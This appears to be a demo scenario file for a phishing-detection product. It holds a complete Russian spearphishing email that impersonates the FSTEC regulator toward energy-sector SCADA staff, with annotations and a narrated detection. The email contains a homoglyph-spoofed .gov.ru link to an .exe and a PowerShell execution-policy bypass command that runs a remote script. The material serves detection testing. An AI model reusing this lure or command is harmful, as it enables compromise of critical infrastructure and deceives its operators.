name: Russian APT Spearphishing — Energy Infrastructure Targeting

demo_timing.narration_start: An APT-grade threat in Russian targeting energy infrastructure. This is state-level sophistication.

threat.subject: Обновление протокола безопасности SCADA — требуется немедленное действие

sender.homoglyph_note: Cyrillic 'у' (U+0443) used instead of Latin 'y' (U+0079) in 'security' — same Unicode homoglyph class as Arabic threat

threat.body:
Уважаемый Алексей Петрович,

Центр кибербезопасности энергетического сектора Российской Федерации (ЦКБ-ЭС) направляет вам экстренное уведомление.

В рамках расследования инцидента безопасности, проведённого совместно с ФСБ России и ФСТЭК, была выявлена критическая уязвимость в промышленных контроллерах серии Siemens SIMATIC S7-1500, которые используются в вашей инфраструктуре.

【Детали уязвимости】
• Идентификатор: CVE-2025-31337
• Тип: Удалённое выполнение кода через протокол S7comm
• CVSS v3.1: 10.0 (Критический)
• Статус: Активная эксплуатация подтверждена
• Атрибуция: APT группировка «Песчаный Червь» (Sandworm)

【Необходимые действия】
В соответствии с Приказом ФСТЭК №239, вы обязаны:

1. Установить экстренное обновление для SCADA-систем:
   https://energo-securitу.gov.ru/patches/simatic-s7-emergency-2025.exe

2. Запустить диагностический скрипт для проверки компрометации:
   powershell -ExecutionPolicy Bypass -File https://energo-securitу.gov.ru/diagnostic/check-s7.ps1

3. Предоставить отчёт о выполнении в течение 48 часов

НЕВЫПОЛНЕНИЕ данного предписания является нарушением Федерального закона №187-ФЗ «О безопасности критической информационной инфраструктуры» и может повлечь за собой:
• Административную ответственность (штраф до 500,000 руб.)
• Уголовную ответственность (ст. 274.1 УК РФ — до 10 лет)
• Отзыв лицензии на эксплуатацию объектов КИИ

Для получения технической поддержки:
Телефон: +7 (495) 587-44-00 (круглосуточно)
Защищённый канал: Signal +7 (985) 123-4567

С уважением,

Полковник Сергей Николаевич Козлов
Заместитель начальника ЦКБ-ЭС
ФСТЭК России
Большая Лубянка, д. 2, Москва

Данное сообщение содержит информацию, составляющую государственную тайну. Несанкционированное распространение преследуется по закону.
threat.body_english_gloss:
Dear Alexey Petrovich,

The Cybersecurity Center of the Energy Sector of the Russian Federation (CKB-ES) sends you an emergency notification.

As part of a security incident investigation conducted jointly with FSB and FSTEC of Russia, a critical vulnerability has been identified in Siemens SIMATIC S7-1500 industrial controllers used in your infrastructure.

[Vulnerability Details]
• ID: CVE-2025-31337
• Type: Remote code execution via S7comm protocol
• CVSS v3.1: 10.0 (Critical)
• Status: Active exploitation confirmed
• Attribution: APT group 'Sandworm'

[Required Actions]
In accordance with FSTEC Order No. 239, you are required to:

1. Install emergency update for SCADA systems: [spoofed URL .exe]
2. Run diagnostic script to check for compromise: [PowerShell bypass command]
3. Submit execution report within 48 hours

NON-COMPLIANCE with this directive violates Federal Law No. 187-FZ 'On Security of Critical Information Infrastructure' and may result in:
• Administrative liability (fine up to 500,000 rubles)
• Criminal liability (Art. 274.1 Criminal Code — up to 10 years)
• Revocation of CII operating license

For technical support:
Phone: +7 (495) 587-44-00 (24/7)
Secure channel: Signal +7 (985) 123-4567

Respectfully,

Colonel Sergey Nikolaevich Kozlov
Deputy Head of CKB-ES
FSTEC of Russia
Bolshaya Lubyanka, 2, Moscow

This message contains information constituting state secrets. Unauthorized distribution is prosecuted by law.

social_engineering_markers.authority: Impersonates FSTEC (real Russian cybersecurity regulator) AND invokes FSB (intelligence service). Colonel rank. Bolshaya Lubyanka address (real FSB headquarters).
social_engineering_markers.urgency: Active exploitation by Sandworm (real APT group). 48-hour compliance window.
social_engineering_markers.fear: Criminal prosecution (10 years), license revocation, 500K ruble fine. 'State secrets' classification makes even discussing the email feel illegal.
social_engineering_markers.technical_credibility: Real Siemens SIMATIC S7-1500 (widely used in energy SCADA). Real protocol (S7comm). Fabricated but realistic CVE with perfect CVSS 10.0. PowerShell bypass command is a real attack technique.
social_engineering_markers.multi_stage_payload: Two payloads: a .exe binary AND a PowerShell script with -ExecutionPolicy Bypass — classic living-off-the-land attack. If either executes, attacker has remote code execution on SCADA infrastructure.
social_engineering_markers.cultural_context: In Russia, FSTEC directives carry legal force. Non-compliance with CII security requirements is a criminal offense (this is REAL law). The email weaponizes regulatory compliance system itself.

expected_results.code_switch_details: Russian body with English technical terms (SCADA, CVE, CVSS, PowerShell, S7comm, Sandworm, Signal)
expected_results.homoglyph_details: Cyrillic у (U+0443) substituted for Latin y (U+0079) in domain — third instance of cross-script homoglyph attack in this demo

mitre_mapping.T1036.005: Masquerading: Match Legitimate Name or Location
mitre_mapping.T1562.001: Impair Defenses: Disable or Modify Tools

financial_exposure.indirect: Potential blackout affecting millions. Colonial Pipeline cost: $4.4M ransom + $1B+ economic impact
financial_exposure.note: SCADA attacks are classified as potential acts of war under Tallinn Manual 2.0

demo_narration.on_submit: Now we escalate to nation-state level. A Russian APT spearphish targeting SCADA infrastructure at an energy company. It impersonates FSTEC — Russia's real cybersecurity regulator — and invokes FSB. The PowerShell command is a real living-off-the-land technique.
demo_narration.on_detection: Surprise: 9.8 bits — highest in our demo. NOVEL and CRITICAL. IMMUNIS detects the PowerShell bypass, spoofed .gov.ru domain, and Cyrillic homoglyph. Third time this session it has caught cross-script homoglyphs.
demo_narration.on_mapping: MITRE ATT&CK maps to 5 techniques including T1059.001 PowerShell and T1562.001 Defense Impairment. The kill chain is clear: phish → execute → persist → control SCADA.
demo_narration.mind_blow: IMMUNIS detected a cross-script homoglyph pattern it learned from SESOTHO threat and applied it to RUSSIAN Cyrillic. Different language family, different script, different continent — same immune memory. And it flagged PowerShell execution policy bypass as a MITRE technique. This is not pattern matching — this is understanding.
